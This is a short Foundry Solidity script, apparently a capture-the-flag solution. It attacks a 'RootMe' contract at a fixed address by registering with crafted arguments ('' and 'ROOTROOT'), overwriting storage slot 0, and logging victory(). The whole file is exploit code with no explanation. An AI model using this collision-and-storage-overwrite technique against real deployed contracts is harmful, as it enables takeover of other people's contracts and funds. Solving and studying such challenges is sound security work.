
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Script.sol";
import "forge-std/console2.sol";

import "./RootMe.sol";

contract Attack is Script {
  
  function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);
        

        RootMe root = RootMe(0x80F353f9F3A89b976653fF3932C518d0A56D86E3);
        root.register("", "ROOTROOT");
        root.write(0, 0x0000000000000000000000000000000000000000000000000000000000000001);
        console2.log(root.victory());

        vm.stopBroadcast();
  }
   
}
